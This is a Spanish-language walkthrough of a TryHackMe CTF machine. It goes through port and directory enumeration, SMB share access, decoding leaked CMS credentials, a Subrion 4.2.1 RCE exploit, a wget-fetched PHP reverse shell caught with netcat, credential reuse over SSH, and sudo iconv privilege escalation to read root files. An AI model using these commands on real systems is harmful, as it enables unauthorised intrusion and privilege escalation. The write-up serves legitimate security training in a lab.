Bienvenidos nuevamente a otra sala de tryhackme. Una maquina con muchas trampas que me hicieron marear y alfinal en algunas ocaciones tuve que pedir ayuda. Esta catalogada como facil pero yo la porndria en dificultad media. Iniciamos nuestra maquina escaneando puertos abiertos y enumerando lo mas que se pueda, la enumeracion es clave. Utilizamos un exploit RCE para ejecutar comandos y transferirnos un archivo para generar una reverse shell en nuetro sistema. Seguimos enumerando mas todavia para toparnos con otro usuario que debemos encontrar para establecer una conexion ssh y escalar privilegios de usuario raiz root con `iconv`

# Recon

Iniciamos nuestro reconocimiento utilizando __nmap__. Le diremos que escanee todos los puertos abiertos, con una tasa de paquetes de 5000, en modo sigiloso sin activar las alertas de seguridad y haciendo el escaneo mas rapido, tambien le diremos que no compruebe si el objetivo este en linea, que no resuelva los nombres del host durante el escaneo evitando que los servidores __DNS__ registren el escaneo y haciendo el escaneo mucho mas rapido, tambien que nos muestre la version del servicio, y lo resuelva todo en modo agresivo "__T4__", usamos verbose para ver el progreso del escaneo y que guarde todo el proceso en formato normal, para luego poder echarle un vistazo siempre que querramos. Ejecutaremos nuestro comando : `sudo nmap  -p- --open --min-rate 5000 -sS -Pn -n -sV -T4 -vvv IPTARGET -oN nmap`

```ruby
Nmap scan report for IPTARGET
Host is up, received user-set (0.25s latency).
Scanned at 2023-07-05 02:57:30 EDT for 28s
Not shown: 65531 closed ports
Reason: 65531 resets
PORT    STATE SERVICE     REASON         VERSION
22/tcp  open  ssh         syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
139/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: Host: TECHSUPPORT; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap

```

Nuestro escaneo de nmap nos muestra los puertos ssh,http y smb abiertos. Navegamos primero al servidor web para obtener una primera impresion del ataque. Nos muestra un servidor apache, asique realizamos nuestro escaneo gobuster para buscar directorios ocultos y mientras se va ejecutando, utilizar smbclient para enumerar el otro puerto disponible.

```bash
gobuster dir -u http://IPTARGET -w /Path/Wordlist -t 100

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://IPTARGET
[+] Threads      : 100
[+] Wordlist     : /usr/share/dirb/wordlists/big.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2023/07/05 03:06:19 Starting gobuster
=====================================================
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/server-status (Status: 403)
/test (Status: 301)
/subrion (Status: 301)
/wordpress (Status: 301)
=====================================================
2023/07/05 03:07:18 Finished

```

```bash
smbclient -L iptarget # Listamos el servicio

Sharename       Type      Comment
---------       ----      -------
  print$          Disk      Printer Drivers
  websvr          Disk      
  IPC$            IPC       IPC Service (TechSupport server (Samba, Ubuntu))

smbclient \\\\IPTARGET/websvr\\ # Entramos en el servicio

smb: \> ls
  .                                   D        0  Sat May 29 03:17:38 2021
  ..                                  D        0  Sat May 29 03:03:47 2021
  enter.txt                           N      273  Sat May 29 03:17:38 2021

# Con more enter.txt podremos leer la nota o la transferimos con get enter.txt
```

Encontramos una nota de texto con unas credenciles de wordpress. La password la vamos a tener que cracker en cyberchef que estara cocinada, como nos indica el texto, con una buena formula. La formula la descubre automaticamente que es **from base58 > from base32 > from  base64 remove non-alphabet chars**.

# Intrusion

Anteriormente hubo muchas trampas, intente probar esas credenciales en wordpress, que si bien sabemos hay un directorio para logearnos en /wp-admin.php pero no tuve exito. Asique nos dirigimos al directorio /subrion, no nos dara ninguna respuesta por lo que tenemos que volver a enumerar con gobuster o realizar una busqueda sobre los diferentes directorios en /subrion. https://kashz.gitbook.io/kashz-jewels/services/subrion-cms

Introducimos las credenciales obtenidas anteriormente en /subrion/panel.
Una vez dentro, ya tenemos el CMS y su version, asique tendremos que buscar un posible exploit.

```bash
searchsploit subrion 4.2.1
searchsploit -m php/webapps/49876.py
```

Una vez obtenido el exploit lo ejecutamos de la siguiente forma para obenter una shell interactiva.

```bash
python3 49876.py -u http://IPTARGET/subrion/panel/ -l admin -p REDACTED
```

Una vez dentro, no podremos mejorara la shell por lo que tenemos que crear otra sesion interactiva dentro de nuestro sitema. Para eso, copiamos nuestra shell php pentest monkey, le daremos permisos de ejecucion y la transferimos al sistema victima. Tenemos que cambiar la extension php por phar 

```bash
chmod +x shell.phar

# En nuestra maquina atacante en el directorio donde tenemos nuestro shell
python3 -m http.server 8080

# En la sesion interactiva del exploit
wget http://IPTARET:8080/shell.phar

# Nos ponemos en escucha
nc -nvlp LPORT
```

Ahora navegaremos al panel del servidor web en la seccion de /uploads y nos deberia aparecer nuestra reverse shell. Hacemos **Click derecho > Get Info** en nuestro archivo malicioso y nos mostrara **Link** en donde tenemos que apretar para generar una reverse shell.

# Priv.Escalation

Tenemos que realizar una enumeracion del sistema, recomiendo que busques alguna herramienta en la que te sientas comodo de enumeracion o puedes hacerlo manualmente hasta toparte con la vulnerabilidad.

En mi caso, como anteriormente en nuestra enumeracion realizada previamante, encontramos el servicio wordpress en el sistema, por lo que, si nos dirigimos al directorio /var/www/html/wordpress encontraremos las configuraciones y base de datos del servicio.
Especialmente en **wp-config.php** encontraremos las credenciales de wordpress. Si intentamos hacer ssh dentro con el usuario que encontramos previamente, no tendremos exito. Dentro del directorio /home, podemos ver otro nombre de usuario, en el que si utilizamos este nombre de usuario con la password obtenida en **wp-config.php** podemos establecer la conexion via ssh.

```bash
ssh scamsite@IPTARGET
```

Listamos los privilegios de superusuario `sudo -l` y tiene permisos en `/usr/bin/iconv`
Nos movemos en el direcotio /usr/bin, editamos el archivo que querramos mirar y ejecutamos lo siguiente:

```bash
LFILE=/root/root.txt
sudo iconv -f 8859_1 -t 8859_1 "$LFILE"
```

Informacion sacada de https://gtfobins.github.io/gtfobins/iconv/